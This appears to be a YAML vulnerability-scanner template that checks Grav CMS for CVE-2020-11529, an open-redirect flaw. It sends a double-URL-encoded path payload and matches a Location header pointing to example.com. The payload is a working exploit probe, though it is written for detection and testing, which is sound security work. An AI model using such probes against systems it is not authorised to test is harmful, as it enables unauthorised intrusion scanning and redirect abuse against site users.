name: poc-yaml-grav-cve-2020-11529-redirect
binding: 396ca214-3b4b-4ae5-8f95-698727f43fc8
manual: true
detail:
    author: 小z
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2020-11529
    vulnerability:
        level: medium
transport: http
set:
    re: '"(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?"'
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /%252f%255cexample.com%252fa%253fb/
            follow_redirects: false
        expression: response.status >= 300 && response.status < 400 && re.bmatches(response.raw_header)
expression: r0()
